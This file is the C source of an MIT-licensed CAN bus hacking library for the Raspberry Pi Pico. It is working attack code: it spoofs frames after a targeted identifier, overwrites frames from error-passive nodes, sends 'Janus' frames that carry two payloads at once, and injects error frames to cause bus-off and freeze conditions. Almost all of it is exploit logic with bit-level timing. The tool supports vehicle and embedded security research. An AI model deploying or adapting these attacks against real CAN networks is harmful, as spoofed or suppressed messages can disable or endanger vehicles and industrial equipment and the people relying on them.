// Copyright 2020 Dr. Ken Tindell (https://kentindell.github.io)
//
// Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
// documentation files (the "Software"), to deal in the Software without restriction, including without limitation
// the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
// to permit persons to whom the Software is furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all copies or substantial portions of
// the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO
// THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
// TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

// CAN hacking library. Targeted at the Raspberry Pi Pico board but should run on anything fast enough
// with a pair of I/O pins.
//
// The Janus Attack sets the bit pattern as follows:
//
// ^_____AAAAABBBBB^__...
// <--a-><-b->
// The first phase is to force a sync, the second phase is bit value A, the third phase is bit value B.
// The wrapper generates two bitstreams. The frame attack can be done provided the devices receiving
// the shorter frame cannot assert an SOF. This can be done by:
//
// 1. Ensuring there is no shorter frame (by mutating the payload until the number of stuff bits is the same)
// 2. Ensuring that traffic is not due yet from the devices that receive the shorter frame.
// 3. Ensuring that the devices that would generate traffic are in error passive mode.

#include "canhack.h"
#include <stdio.h>

struct canhack;

// This is the CAN frame bit pattern that will be transmitted after observing 11 idle bits
struct canhack {

    canhack_frame_t can_frame1;                 // CAN frame shared with API
    canhack_frame_t can_frame2;                 // CAN frame shared with API

    // Status
    bool sent;                                  // Indicates if frame sent or not

    uint32_t canhack_timeout;                   // Set to 0 to stop a function

    struct {
        uint64_t bitstream_mask;
        uint64_t bitstream_match;
        uint32_t n_frame_match_bits;
        uint32_t n_frame_match_bits_cntdn;
        uint32_t attack_cntdn;
        uint32_t dominant_bit_cntdn;
    } attack_parameters;
    
};

struct canhack canhack;

TIME_CRITICAL void canhack_set_timeout(uint32_t timeout)
{
    canhack.canhack_timeout = timeout;
}

/// \brief Stop the current operation running
TIME_CRITICAL void canhack_stop(void)
{
    canhack.canhack_timeout = 0;
}

// Returns true if should re-enter arbitration due to lost arbitration and/or error.
// Returns false if sent
TIME_CRITICAL bool send_bits(ctr_t bit_end, ctr_t sample_point, struct canhack *canhack_p, uint16_t tx_index, canhack_frame_t *frame)
{
    ctr_t now;
    uint32_t rx;
    uint8_t tx = frame->tx_bitstream[tx_index++];
    uint8_t cur_tx = tx;

    for (;;) {
        now = GET_CLOCK();

        // Bit end is scanned first because it needs to execute as close to the time as possible
        if (REACHED(now, bit_end)) {
            SET_CAN_TX(tx);
            bit_end = ADVANCE(bit_end, BIT_TIME);
            
            // Fast data switch
            if ((tx_index == frame->brs_bit + 1) & tx) {
                bit_end = bit_end - SAMPLE_TO_BIT_END_FD;
                sample_point = bit_end - SAMPLE_TO_BIT_END_FD;

                cur_tx = tx;
                tx = frame->tx_bitstream[tx_index++];

                for (;;) {
                    now = GET_CLOCK();

                    // Bit end is scanned first because it needs to execute as close to the time as possible
                    if (REACHED(now, bit_end)) {
                        SET_CAN_TX(tx);
                        bit_end = ADVANCE(bit_end, BIT_TIME_FD);

                        if (tx_index >= (frame->last_crc_bit + 2)) {
                            bit_end = bit_end - SAMPLE_TO_BIT_END_FD + SAMPLE_TO_BIT_END;
                            sample_point = bit_end - SAMPLE_TO_BIT_END;

                            cur_tx = tx;
                            tx = frame->tx_bitstream[tx_index++];

                            break;
                        }

                        // The next bit is set up after the time because the critical I/O operation has taken place now
                        cur_tx = tx;
                        tx = frame->tx_bitstream[tx_index++];
                        
                    }

                    if (REACHED(now, sample_point)) {
                        rx = GET_CAN_RX();
                        if (rx != cur_tx) {
                                // If arbitration then lost, or an error, then give up and go back to SOF
                                SET_CAN_TX_REC()
                                return true;
                        }
                        sample_point = ADVANCE(sample_point, BIT_TIME_FD);
                    }

                    if (canhack.canhack_timeout-- == 0) {
                        return false;
                    }
                }
            }

            // The next bit is set up after the time because the critical I/O operation has taken place now
            cur_tx = tx;
            tx = frame->tx_bitstream[tx_index++];
            
            if (tx_index >= (frame->last_eof_bit + 3)) {
                // Finished
                SET_CAN_TX_REC();
                canhack_p->sent = true;
                return false;
            }
        }

        if (REACHED(now, sample_point)) {
            rx = GET_CAN_RX();
            if (rx != cur_tx) {
                    // If arbitration then lost, or an error, then give up and go back to SOF
                    SET_CAN_TX_REC()
                    return true;
            }
            sample_point = ADVANCE(sample_point, BIT_TIME);
        }

        if (canhack.canhack_timeout-- == 0) {
            return false;
        }
    }
}

// Sends a sequence of bits, returns true if lost arbitration or an error
TIME_CRITICAL bool send_janus_bits(ctr_t bit_end, uint32_t sync_time, uint32_t split_time, ctr_t sync_time_fd, ctr_t split_time_fd, struct canhack *canhack_p, uint8_t tx_index)
{
    ctr_t now;
    uint8_t rx;
    uint8_t tx1;
    uint8_t tx2;
    uint16_t tx_bits = canhack_p->can_frame1.tx_bits > canhack_p->can_frame2.tx_bits ? canhack_p->can_frame1.tx_bits : canhack_p->can_frame2.tx_bits;
    uint32_t cur_bit_time = BIT_TIME;

    uint32_t sync_end = ADVANCE(bit_end, sync_time);
    uint32_t split_end = ADVANCE(bit_end, split_time);

    for (;;) {
        for (;;) {
            now = GET_CLOCK();
            // Bit end is scanned first because it needs to execute as close to the time as possible
            if (REACHED(now, bit_end)) {
                // Set a dominant state to force a sync (if previous sample was a 1) in all the CAN controllers
                SET_CAN_TX_DOM();
                // The next bit is set up after the time because the critical I/O operation has taken place now
                tx1 = canhack_p->can_frame1.tx_bitstream[tx_index];
                bit_end = ADVANCE(bit_end, cur_bit_time);
                break;
            }
            if (canhack.canhack_timeout-- == 0) {
                SET_CAN_TX_REC();
                return false;
            }
        }
        for (;;) {
            now = GET_CLOCK();
            if (REACHED(now, sync_end)) {
                SET_CAN_TX(tx1);
                tx2 = canhack_p->can_frame2.tx_bitstream[tx_index];
                tx_index++;
                if (tx_index >= tx_bits) {
                    // Finished
                    SET_CAN_TX_REC();
                    canhack_p->sent = true;
                    return false;
                }
                sync_end = ADVANCE(sync_end, cur_bit_time);
                if ((tx_index == canhack_p->can_frame1.brs_bit + 1) & tx1) {
                    cur_bit_time = BIT_TIME_FD;
                    bit_end = bit_end - SAMPLE_TO_BIT_END_FD;
                    sync_end = ADVANCE(bit_end, sync_time_fd);
                }
                if (tx_index == canhack_p->can_frame1.last_crc_bit + 2) {
                    cur_bit_time = BIT_TIME;
                    bit_end = bit_end - SAMPLE_TO_BIT_END_FD + SAMPLE_TO_BIT_END;
                    sync_end = ADVANCE(bit_end, sync_time);
                }
                break;
            }
            if (canhack.canhack_timeout-- == 0) {
                SET_CAN_TX_REC();
                return false;
            }
        }
        for (;;) {
            now = GET_CLOCK();
            if (REACHED(now, split_end)) {
                rx = GET_CAN_RX();
                SET_CAN_TX(tx2);
                split_end = ADVANCE(split_end, cur_bit_time);
                if ((tx_index == canhack_p->can_frame2.brs_bit + 1) & tx2) {
                    split_end = ADVANCE(bit_end, split_time_fd);
                }
                if (tx_index == canhack_p->can_frame2.last_crc_bit + 2) {
                    split_end = ADVANCE(bit_end, split_time);
                }
                if (rx != tx1) {
                    SET_CAN_TX_REC();
                    return false;
                }
                break;
            }
            if (canhack.canhack_timeout-- == 0) {
                SET_CAN_TX_REC();
                return false;
            }
        }
    }
}

TIME_CRITICAL void canhack_send_square_wave(void)
{
    RESET_CLOCK(0);
    ctr_t now = 0;
    ctr_t bit_end = BIT_TIME;
    uint8_t tx = 0;

    canhack.canhack_timeout = 160U;

    for (;;) {
        now = GET_CLOCK();

        if (REACHED(now, bit_end)) {
            SET_CAN_TX(tx);
            bit_end = ADVANCE(now, BIT_TIME);
            tx ^= 1U; // Toggle bit
        }
        if (canhack.canhack_timeout-- == 0) {
            SET_CAN_TX_REC();
            return;
        }
    }
}

TIME_CRITICAL void canhack_loopback(bool fd)
{
    uint8_t rx = 0U;
    uint8_t prev_rx;

    for (;;) {
        // Wait for falling edge
        prev_rx = rx;
        rx = gpio_get(CAN_RX_PIN);
        if (prev_rx && !rx) {
            break;
        }
        if (canhack.canhack_timeout-- == 0) {
            SET_CAN_TX_REC();
            return;
        }
    }

    // Echo loopback for a number of bit times, starting with a falling edge
    // This should output on to the debug pin any incoming CAN frame
    uint i = 160U;
    if (fd) {
        i = 700U;   // Function has to run longer with fd frames (no brs -> more than 600 bit times)
    }
    ctr_t bit_end = BIT_TIME;
    RESET_CLOCK(0);
    while(i > 0) {
        SET_DEBUG(GET_CAN_RX());
        ctr_t now = GET_CLOCK();
        if (REACHED(now, bit_end)) {
            bit_end = ADVANCE(now, BIT_TIME);
            i--;
        }
        if (canhack.canhack_timeout-- == 0) {
            SET_CAN_TX_REC();
            return;
        }
    }
    SET_CAN_TX_REC();
}

// Sends frame 1, returns true if sent (false if a timeout or too many retries)
TIME_CRITICAL bool canhack_send_frame(uint32_t retries, bool second)
{
    uint32_t prev_rx = 0;
    struct canhack *canhack_p = &canhack;
    canhack_frame_t *can_frame = second ? &canhack_p->can_frame2 : &canhack_p->can_frame1;
    uint32_t bitstream = 0;
    uint16_t tx_index;

    // Look for 11 recessive bits or 10 recessive bits and a dominant
    uint8_t rx;
    RESET_CLOCK(0);
    ctr_t now;
    ctr_t sample_point = SAMPLE_POINT_OFFSET;
SOF:
    for (;;) {
        rx = GET_CAN_RX();
        now = GET_CLOCK();

        if (prev_rx && !rx) {
            RESET_CLOCK(0);
            sample_point = SAMPLE_POINT_OFFSET;
        }
        else if (REACHED(now, sample_point)) {
            ctr_t bit_end = ADVANCE(sample_point, SAMPLE_TO_BIT_END);
            sample_point = ADVANCE(now, BIT_TIME);

            bitstream = (bitstream << 1U) | rx;
            if ((bitstream & 0x7feU) == 0x7feU) {
                // 11 bits, either 10 recessive and dominant = SOF, or 11 recessive
                // If the last bit was recessive then start index at 0, else start it at 1 to skip SOF
                tx_index = rx ^ 1U;
                if (send_bits(bit_end, sample_point, canhack_p, tx_index, can_frame)) {
                    if (retries--) {
                        bitstream = 0; // Make sure we wait until EOF+IFS to trigger next attempt
                        goto SOF;
                    }
                    return false;
                }
                return canhack_p->sent;
            }
        }
        prev_rx = rx;
        if (canhack.canhack_timeout-- == 0) {
            SET_CAN_TX_REC();
            return false;
        }
    }
}

// This sends a Janus frame, with sync_end being the relative time from the start of a bit when
// the value for the first bit value is asserted, and first_end is the time relative from the start
// of a bit when the second bit value is asserted.
TIME_CRITICAL bool canhack_send_janus_frame(ctr_t sync_time, ctr_t split_time, ctr_t sync_time_fd, ctr_t split_time_fd, uint32_t retries)
{
    uint32_t prev_rx = 0;
    struct canhack *canhack_p = &canhack;
    uint32_t bitstream = 0;
    uint8_t tx_index;

    // Look for 11 recessive bits or 10 recessive bits and a dominant
    RESET_CLOCK(0);
    uint8_t rx;
    ctr_t now = GET_CLOCK();
    ctr_t sample_point = ADVANCE(now, SAMPLE_POINT_OFFSET);

SOF:
    for (;;) {
        rx = GET_CAN_RX();
        now = GET_CLOCK();

        if (prev_rx && !rx) {
            RESET_CLOCK(0);
            sample_point = SAMPLE_POINT_OFFSET;
        }
        else if (REACHED(now, sample_point)) {
            bitstream = (bitstream << 1U) | rx;
            ctr_t bit_end = ADVANCE(sample_point, SAMPLE_TO_BIT_END);
            sample_point = ADVANCE(sample_point, BIT_TIME);
            if ((bitstream & 0x7feU) == 0x7feU) {
                // 11 bits, either 10 recessive and dominant = SOF, or 11 recessive
                // If the last bit was recessive then start index at 0, else start it at 1 to skip SOF
                tx_index = rx ^ 1U;
                if (send_janus_bits(bit_end, sync_time, split_time, sync_time_fd, split_time_fd, canhack_p, tx_index)) {
                    if (retries--) {
                        bitstream = 0; // Make sure we wait until EOF+IFS to trigger next attempt
                        goto SOF;
                    }
                    return false;
                }
                else {
                    return canhack_p->sent;
                }
            }
        }
        prev_rx = rx;
        if (canhack.canhack_timeout-- == 0) {
            SET_CAN_TX_REC();
            return false;
        }
    }
}

#ifdef NOTDEF
// Print 64-bit shift value; used for debugging/testing shift registers
static void print_uint64(uint64_t n)
{
    for (uint32_t i = 0; i < 64U; i++) {
        if (1ULL << (63U - i) & n) {
            printf("1");
        }
        else {
            printf("0");
        }
    }
    printf("\n");
}
#endif

// Wait for a targeted frame and then transmit the spoof frame after winning arbitration next
TIME_CRITICAL bool canhack_spoof_frame(bool janus, ctr_t sync_time, ctr_t split_time, ctr_t sync_time_fd, ctr_t split_time_fd, uint32_t retries)
{
    uint32_t prev_rx = 1U;
    struct canhack *canhack_p = &canhack;
    uint64_t bitstream = 0;
    uint64_t bitstream_mask = canhack_p->attack_parameters.bitstream_mask;
    uint64_t bitstream_match = canhack_p->attack_parameters.bitstream_match;

    uint8_t rx;
    RESET_CLOCK(0);
    ctr_t now;
    ctr_t sample_point = SAMPLE_POINT_OFFSET;

    for (;;) {
        rx = GET_CAN_RX();
        now = GET_CLOCK();

        // This in effect is the bus integration phase of CAN
        if (prev_rx && !rx) {
            RESET_CLOCK(0);
            sample_point = SAMPLE_POINT_OFFSET;
        }
        else if (REACHED(now, sample_point)) {
            sample_point = ADVANCE(sample_point, BIT_TIME);
            bitstream = (bitstream << 1U) | rx;
            // Search for 10 recessive bits and a dominant bit = SOF plus the rest of the identifier, all in one test
            if ((bitstream & bitstream_mask) == bitstream_match) {
                if (janus) {
                    return canhack_send_janus_frame(sync_time, split_time, sync_time_fd, split_time_fd, retries);
                }
                else {
                    return canhack_send_frame(retries, false);
                }
            }
        }
        prev_rx = rx;
        if (canhack.canhack_timeout-- == 0) {
            SET_CAN_TX_REC();
            return false;
        }
    }
 }

// Wait for a targeted frame and then transmit the spoof frame over the top of the targeted frame
// Returns true if the frame was sent OK, false if there was an error or a timeout
TIME_CRITICAL bool canhack_spoof_frame_error_passive(uint32_t loopback_offset)
{
    uint32_t prev_rx = 1U;
    struct canhack *canhack_p = &canhack;
    uint64_t bitstream = 0;
    uint64_t bitstream_mask = canhack_p->attack_parameters.bitstream_mask;
    uint64_t bitstream_match = canhack_p->attack_parameters.bitstream_match;

    uint8_t rx;
    RESET_CLOCK(0);
    ctr_t now;
    ctr_t sample_point = SAMPLE_POINT_OFFSET;

    for (;;) {
        rx = GET_CAN_RX();
        now = GET_CLOCK();

        if (prev_rx && !rx) {
            RESET_CLOCK(0);
            sample_point = SAMPLE_POINT_OFFSET;
        }
        else if (REACHED(now, sample_point)) {
            ctr_t bit_end = ADVANCE(sample_point, SAMPLE_TO_BIT_END);
            sample_point = ADVANCE(sample_point, BIT_TIME);
            bitstream = (bitstream << 1U) | rx;
            // Search for 10 recessive bits and a dominant bit = SOF plus the rest of the identifier, all in one test
            if ((bitstream & bitstream_mask) == bitstream_match) {
                send_bits(bit_end - loopback_offset, sample_point - loopback_offset, canhack_p, canhack_p->attack_parameters.n_frame_match_bits, &canhack.can_frame1);
                return canhack_p->sent;
            }
        }
        prev_rx = rx;
        if (canhack.canhack_timeout-- == 0) {
            SET_CAN_TX_REC();
            return false;
        }
    }
}

TIME_CRITICAL bool canhack_error_attack(uint32_t repeat, bool inject_error, uint32_t eof_mask, uint32_t eof_match)
{
    uint32_t prev_rx = 1U;
    struct canhack *canhack_p = &canhack;
    uint64_t bitstream64 = 0;
    uint64_t bitstream64_mask = canhack_p->attack_parameters.bitstream_mask;
    uint64_t bitstream64_match = canhack_p->attack_parameters.bitstream_match;
    bool brs = canhack_p->can_frame1.brs;
    uint64_t eof_mask_brs = 1;
    uint64_t eof_match_brs = 1;
    uint32_t tmp_eof_mask = eof_mask;
    uint32_t tmp_eof_match = eof_match;
    
    if (brs) {
        while (tmp_eof_mask) {
            eof_mask_brs <<= 4;
            tmp_eof_mask >>= 1;
        }
        eof_mask_brs -= 1;      // turn the single set bit at position 4*N into a run of 4*N ones

        while (tmp_eof_match) {
            eof_match_brs <<= 4;
            tmp_eof_match >>= 1;
        }
        eof_match_brs -= 1;     // likewise: 4x expansion of the recessive match run (was "=- 1", a no-op assignment of -1)
    }

    uint8_t rx;
    RESET_CLOCK(0);
    ctr_t now;
    ctr_t sample_point = SAMPLE_POINT_OFFSET;
    ctr_t bit_end;

    for (;;) {
        now = GET_CLOCK();
        rx = GET_CAN_RX();
        if (prev_rx && !rx) {
            RESET_CLOCK(FALLING_EDGE_RECALIBRATE);
            sample_point = SAMPLE_POINT_OFFSET;
        }
        else if (REACHED(now, sample_point)) {
            bitstream64 = (bitstream64 << 1U) | rx;
            bit_end = sample_point + SAMPLE_TO_BIT_END;
            sample_point = ADVANCE(sample_point, BIT_TIME);
            // Search for 10 recessive bits and a dominant bit = SOF plus the rest of the identifier, all in one test
            if ((bitstream64 & bitstream64_mask) == bitstream64_match) {
                break;
                // Now want to inject an (optional) error frame
            }
        }
        prev_rx = rx;
        if (canhack.canhack_timeout-- == 0) {
            return false;
        }
    }

    // bit_end is in the future, sample_point is after bit_end

    // Inject an error frame
    if (inject_error) {
        for (;;) {
            now = GET_CLOCK();
            if (REACHED(now, bit_end)) {
                SET_CAN_TX_DOM();
                break;
            }
        }
        bit_end = ADVANCE(bit_end, BIT_TIME * 6U);
        sample_point = ADVANCE(sample_point, BIT_TIME * 6U);
        for (;;) {
            now = GET_CLOCK();
            if (REACHED(now, bit_end)) {
                SET_CAN_TX_REC();
                break;
            }
            if (canhack.canhack_timeout-- == 0) {
                SET_CAN_TX_REC();
                return false;
            }
        }
    }

    // Now wait for error delimiter / IFS point to inject a bit one or more times
    uint64_t eof_bitstream = 0;
    uint64_t eff_eof_mask = eof_mask;
    uint64_t eff_eof_match = eof_match;
    uint32_t cur_sample_point_offset = SAMPLE_POINT_OFFSET;
    uint32_t cur_bit_time = BIT_TIME;
    if (brs) {
        cur_sample_point_offset = SAMPLE_POINT_OFFSET_FD;
        cur_bit_time = BIT_TIME_FD;
        // 64-bit so the 4x BRS expansion is not truncated: the freeze-doom-loop's 9-bit
        // EOF mask expands to 36 bits, which overflowed the old 32-bit detection register
        // and made the attack miss on BRS CAN FD frames.
        eff_eof_mask = eof_mask_brs;
        eff_eof_match = eof_match_brs;
    }

    for (uint32_t i = 0; i < repeat; i++) {
        for (;;) {
            now = GET_CLOCK();
            rx = GET_CAN_RX();
            if (prev_rx && !rx) {
                RESET_CLOCK(FALLING_EDGE_RECALIBRATE);
                sample_point = cur_sample_point_offset;
            }
            else if (REACHED(now, sample_point)) {
                eof_bitstream = (eof_bitstream << 1U) | rx;
                bit_end = sample_point + cur_sample_point_offset;
                sample_point = ADVANCE(sample_point, cur_bit_time);
                if ((eof_bitstream & eff_eof_mask) == eff_eof_match) {
                    // Inject six dominant bits to ensure an error frame is handled (in case all other devices are
                    // error passive and do not signal active error frames)
                    for (;;) {
                        now = GET_CLOCK();
                        if (REACHED(now, bit_end)) {
                            SET_CAN_TX_DOM();
                            bit_end = ADVANCE(bit_end, BIT_TIME * 7U);
                            sample_point = ADVANCE(sample_point, BIT_TIME * 7U);
                            eof_bitstream = eof_bitstream << 7U; // Pseudo-sample of own dominant bits
                            break;
                        }
                    }
                    for (;;) {
                        now = GET_CLOCK();
                        if (REACHED(now, bit_end)) {
                            SET_CAN_TX_REC();
                            break;
                        }
                    }
                    break;
                }
            }
            prev_rx = rx;
            if (canhack.canhack_timeout-- == 0) {
                SET_CAN_TX_REC();
                return false;
            }
        }
    }
    return true;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
// CAN frame creator.
//
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
static void add_raw_bit(uint8_t bit, bool stuff, canhack_frame_t *frame)
{
    // Record the status of the stuff bit for display purposes
    frame->stuff_bit[frame->tx_bits] = stuff;
    if (stuff) {
        frame->stuff_count++;                       // raise stuff count (only needed in fd frames)
    }
    frame->tx_bitstream[frame->tx_bits++] = bit;
}

// CRC for normal CAN
static void do_crc(uint8_t bitval, canhack_frame_t *frame)
{
    uint32_t bit_14 = (frame->crc_rg & (1U << 14U)) >> 14U;
    uint32_t crc_nxt = bitval ^ bit_14;
    frame->crc_rg <<= 1U;
    frame->crc_rg &= 0x7fffU;
    if (crc_nxt) {
        frame->crc_rg ^= 0x4599U;
    }
}

// CRC for CAN FD
static void do_crc17(uint8_t bitval, canhack_frame_t *frame)
{
    uint32_t bit_16 = (frame->crc_rg & (1U << 16U)) >> 16U;
    uint32_t crc_nxt = bitval ^ bit_16;
    frame->crc_rg <<= 1U;
    frame->crc_rg &= 0x1ffffU;
    if (crc_nxt) {
        frame->crc_rg ^= 0x3685bU;
    }
}

// CRC for CAN FD (13+ data bytes)
static void do_crc21(uint8_t bitval, canhack_frame_t *frame)
{
    uint32_t bit_20 = (frame->crc_rg & (1U << 20U)) >> 20U;
    uint32_t crc_nxt = bitval ^ bit_20;
    frame->crc_rg <<= 1U;
    frame->crc_rg &= 0x1fffffU;
    if (crc_nxt) {
        frame->crc_rg ^= 0x302899U;
    }
}

static void add_bit(uint8_t bit, canhack_frame_t *frame, uint32_t dlc)
{
    // Choose crc based on CAN type and dlc
    if (frame->crcing) {
        if (frame->fd) {
            if (dlc > 10) {
                do_crc21(bit, frame);
            } 
            else {
                do_crc17(bit, frame);
            }
        } 
        else {
            do_crc(bit, frame);
        }
    }

    // Add bit to bitstream and count up for potential stuff bits
    add_raw_bit(bit, false, frame);
    if (bit) {
        frame->recessive_bits++;
        frame->dominant_bits = 0;
    } 
    else {
        frame->dominant_bits++;
        frame->recessive_bits = 0;
    }
    if (frame->stuffing) {

        if (frame->dominant_bits >= 5U) {

            // stuff bits count into crc in FD frames
            if (frame->fd) {
                if (dlc > 10) {
                    do_crc21(1U, frame);
                } 
                else {
                    do_crc17(1U, frame);
                }
            }

            add_raw_bit(1U, true, frame);
            frame->dominant_bits = 0;
            frame->recessive_bits = 1U;
        }

        if (frame->recessive_bits >= 5U) {

            // stuff bits count into crc in FD frames
            if (frame->fd) {
                if (dlc > 10) {
                    do_crc21(0, frame);
                } 
                else {
                    do_crc17(0, frame);
                }
            }
            
            add_raw_bit(0, true, frame);
            frame->dominant_bits = 1U;
            frame->recessive_bits = 0;
        }
    } 
    else {

    }
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
// API to module
//
////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void canhack_set_frame(uint32_t id_a, uint32_t id_b, bool rtr, bool ide, uint32_t dlc, const uint8_t *data, canhack_frame_t *frame, bool fd, bool brs, bool esi)
{
    uint8_t len = 0;    // RTR frames have a DLC of any value but no data field
    if (!rtr) {
        if (fd & (dlc > 8)) {
            if (dlc <= 12) {
                len = 4U * (dlc - 6U);
            } 
            else if (dlc == 13) {
                len = 32;
            } 
            else {
                len = 16U * (dlc - 11U);
            }
        } 
        else {
            len = dlc >= 8U ? 8U : dlc;
        }
    }

    // set crc_rg and crc_len (only needed for fd)
    uint32_t crc_len = 17U;
    if (fd) {
        if (dlc > 10) {
            crc_len = 21U;
        }
        frame->crc_rg = 1U << (crc_len - 1U);
    } 
    else {
        frame->crc_rg = 0;
    }
    
    // init variables
    frame->tx_bits = 0;
    frame->stuffing = true;
    frame->crcing = true;
    frame->dominant_bits = 0;
    frame->recessive_bits = 0;
    frame->stuff_count = 0;
    frame->fd = fd;
    frame->brs = brs;

    for (uint32_t i = 0; i < CANHACK_MAX_BITS; i++) {
        frame->tx_bitstream[i] = 0;
    }

    // ID field is:
    // {SOF, ID A, RTR, IDE = 0, r0} [Standard]
    // {SOF, ID A, SRR = 1, IDE = 1, ID B, RTR, r1, r0) [Extended]

    // SOF
    add_bit(0, frame, dlc);

    // ID A
    id_a <<= 21U;
    for (uint32_t i = 0; i < 11U; i++) {
        if (id_a & 0x80000000U) {
            add_bit(1U, frame, dlc);
        }
        else {
            add_bit(0, frame, dlc);
        }
        id_a <<= 1U;
    }

    // RTR/SRR (RRS for non extended FD)
    if (rtr || ide) {
        add_bit(1U, frame, dlc); // RTR (if set) or SRR
    }
    else {
        add_bit(0, frame, dlc); // RTR or RRS
    }

    // The last bit of the arbitration field is the RTR bit if a basic frame; this might be overwritten if IDE = 1
    frame->last_arbitration_bit = frame->tx_bits - 1U;

    // IDE
    if (ide) {
        add_bit(1U, frame, dlc);
    }
    else {
        add_bit(0, frame, dlc);
    }

    if (ide) {
        // ID B
        id_b <<= 14U;
        for (uint32_t i = 0; i < 18U; i++) {
            if (id_b & 0x80000000U) {
                add_bit(1U, frame, dlc);
            } 
            else {
                add_bit(0, frame, dlc);
            }
            id_b <<= 1U;
        }
        // RTR (RRS for fd)
        if (rtr) {
            add_bit(1U, frame, dlc);
        }
        else {
            add_bit(0, frame, dlc);
        }
        // The RTR bit is the last bit in the arbitration field if an extended frame
        frame->last_arbitration_bit = frame->tx_bits - 1U;

    }
    else {
        // If IDE = 0 then the last arbitration field bit is the RTR
    }

    // r1 (FDF in FD frames)
    if (fd) {
        add_bit(1U, frame, dlc);
    } 
    else if (ide){
        add_bit(0, frame, dlc);
    }

    // r0 (res in FD frames)
    add_bit(0, frame, dlc);

    // Additional bits for FD
    if (fd) {

        // BRS bit rate switch
        if (brs) {
            add_bit(1U, frame, dlc);
            frame->brs_bit = frame->tx_bits - 1U;
        } 
        else {
            add_bit(0, frame, dlc);
            frame->brs_bit = CANHACK_MAX_BITS;
        }

        // ESI error state indicator
        if (esi) {
            add_bit(0, frame, dlc);
        } 
        else {
            add_bit(1U, frame, dlc);
        }
    }

    // DLC
    uint32_t dlc_put = dlc << 28U;
    for (uint32_t i = 0; i < 4U; i++) {
        if (dlc_put & 0x80000000U) {
            add_bit(1U, frame, dlc);
        } 
        else {
            add_bit(0, frame, dlc);
        }
        dlc_put <<= 1U;
    }
    frame->last_dlc_bit = frame->tx_bits - 1U;

    // Data
    for (uint32_t i = 0; i < len; i ++) {
        uint8_t byte = data[i];
        for (uint32_t j = 0; j < 8; j++) {

            // if the last data bit is a stuff bit, it will be replaced by the first fsb
            if (fd) {
                if ((i == len-1) & (j == 7)) {
                    frame->stuffing = false;
                }
            }
            if (byte & 0x80U) {
                add_bit(1U, frame, dlc);
            } 
            else {
                add_bit(0, frame, dlc);
            }
            byte <<= 1U;
        }
    }

    // If the length is 0 then the last data bit is equal to the last DLC bit
    frame->last_data_bit = frame->tx_bits - 1U;

    // CRC for CAN
    if (!fd) {
        frame->crcing = false;
        uint32_t crc_rg = frame->crc_rg << 17U;
        for (uint32_t i = 0; i < 15; i++) {
            if (crc_rg & 0x80000000U) {
                add_bit(1U, frame, dlc);
            } 
            else {
                add_bit(0, frame, dlc);
            }
        crc_rg <<= 1U;
        }    
    } 
    // CRC and STC for FD
    else {

        // First FSB (last_data_bit adjustment if necessary)
        if (frame->tx_bitstream[frame->last_data_bit]) {
            add_raw_bit(0, true, frame);
            if (frame->dominant_bits == 4) {
                frame->last_data_bit++;
            }
        } 
        else {
            add_raw_bit(1U, true, frame);
            if (frame->recessive_bits == 4) {
                frame->last_data_bit++;
            }
        }
        frame->stuff_count--;

        // set up gray-coded stuff count
        uint8_t stc = frame->stuff_count % 8;
        uint8_t gc_stc;
        switch(stc) {
            case 1:
                gc_stc = 0b00000001;
                break;
            case 2:
                gc_stc = 0b00000011;
                break;
            case 3:
                gc_stc = 0b00000010;
                break;
            case 4:
                gc_stc = 0b00000110;
                break;
            case 5:
                gc_stc = 0b00000111;
                break;
            case 6:
                gc_stc = 0b00000101;
                break;
            case 7:
                gc_stc = 0b00000100;
                break;
            default:
                gc_stc = 0b00000000;
                break;
        }
        uint8_t parity = frame->stuff_count & 0x1U;

        // Stuff Count and Parity
        for (uint32_t i = 0; i < 3; i++) {
            if (gc_stc & 0x4U) {
                add_bit(1U, frame, dlc);
            } 
            else {
                add_bit(0, frame, dlc);
            }
            gc_stc <<= 1U;
        }
        add_bit(parity, frame, dlc);

        // Second FSB
        if (parity) {
            add_raw_bit(0, true, frame);
        } 
        else {
            add_raw_bit(1U, true, frame);
        }

        // Stop crc
        frame->crcing = false;

        // Put crc with FSBs
        uint32_t crc_rg = frame->crc_rg << (32U - crc_len);
        for (uint32_t i = 0; i < crc_len; i++) {
            if (crc_rg & 0x80000000U) {
                add_bit(1U, frame, dlc);
                if ((i+1)%4 == 0) {
                    add_raw_bit(0, true, frame);
                }
            }
            else {
                add_bit(0, frame, dlc);
                if ((i+1)%4 == 0) {
                    add_raw_bit(1U, true, frame);
                }
            }
            crc_rg <<= 1U;
        }
    }
    frame->last_crc_bit = frame->tx_bits - 1U;

    // Bit stuffing is disabled at the end of the CRC field
    frame->stuffing = false;

    // CRC delimiter
    add_bit(1U, frame, dlc);

    // ACK; we transmit this as a dominant bit to ensure the state machines lock on to the right
    // EOF field; it's mostly moot since if there are no CAN controllers then there is not much
    // hacking to do.
    add_bit(0, frame, dlc);

    // ACK delimiter
    add_bit(1U, frame, dlc);

    // EOF
    add_bit(1U, frame, dlc);
    add_bit(1U, frame, dlc);
    add_bit(1U, frame, dlc);
    add_bit(1U, frame, dlc);
    add_bit(1U, frame, dlc);
    add_bit(1U, frame, dlc);
    add_bit(1U, frame, dlc);
    frame->last_eof_bit = frame->tx_bits - 1U;

    // IFS
    add_bit(1U, frame, dlc);
    add_bit(1U, frame, dlc);
    add_bit(1U, frame, dlc);

    // Set up the matching masks for this CAN frame
    frame->tx_arbitration_bits = frame->last_arbitration_bit + 1U;

    frame->frame_set = true;
}

canhack_frame_t *canhack_get_frame(bool second)
{
    return second ? &canhack.can_frame2 : &canhack.can_frame1;
}

